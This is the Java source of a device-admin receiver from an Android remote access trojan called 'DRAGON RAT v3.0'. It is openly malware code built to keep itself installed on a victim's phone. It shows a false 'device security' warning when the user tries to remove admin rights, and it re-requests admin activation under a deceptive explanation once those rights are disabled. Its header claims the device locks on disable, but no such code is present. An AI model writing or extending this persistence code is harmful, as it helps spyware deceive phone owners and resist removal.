package com.dragon.rat;

import android.app.admin.DeviceAdminReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * DRAGON RAT v3.0 — Device Admin Receiver
 * Prevents uninstallation by requiring device admin deactivation first
 * Locks device if admin is disabled
 */
public class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
    }
    
    @Override
    public void onDisableRequested(Context context, Intent intent) {
        // Block disabling — user can't uninstall
        Toast.makeText(context, "❌ Cannot disable: Device security active", 
            Toast.LENGTH_LONG).show();
        super.onDisableRequested(context, intent);
    }
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        // Re-enable immediately
        enableAgain(context);
    }
    
    private void enableAgain(Context context) {
        ComponentName componentName = new ComponentName(context, DeviceAdminReceiver.class);
        android.app.admin.DevicePolicyManager dpm = 
            (android.app.admin.DevicePolicyManager) 
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        
        if (dpm != null && !dpm.isAdminActive(componentName)) {
            Intent intent = new Intent(
                android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                componentName);
            intent.putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for device security features");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }
    
    @Override
    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
        super.onLockTaskModeEntering(context, intent, pkg);
    }
    
    @Override
    public void onLockTaskModeExiting(Context context, Intent intent) {
        super.onLockTaskModeExiting(context, intent);
    }
}
